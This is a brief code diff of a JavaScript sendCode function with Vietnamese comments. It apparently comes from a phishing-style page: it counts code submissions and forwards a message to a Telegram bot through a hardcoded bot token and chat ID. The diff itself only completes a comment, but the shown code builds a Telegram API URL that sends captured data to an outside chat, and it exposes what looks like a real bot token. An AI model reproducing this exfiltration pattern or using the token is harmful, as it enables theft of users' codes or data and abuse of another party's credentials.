@@ -179,7 +179,7 @@ function sendCode() {
 
         NUMBER_TIME_SEND_CODE++;
         const botToken = '7615708892:AAH5D5-PdEI2az_6YG0ls8D29jQp2uelIe0'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-4956802758'; /
+        const chatId = '-4956802758'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
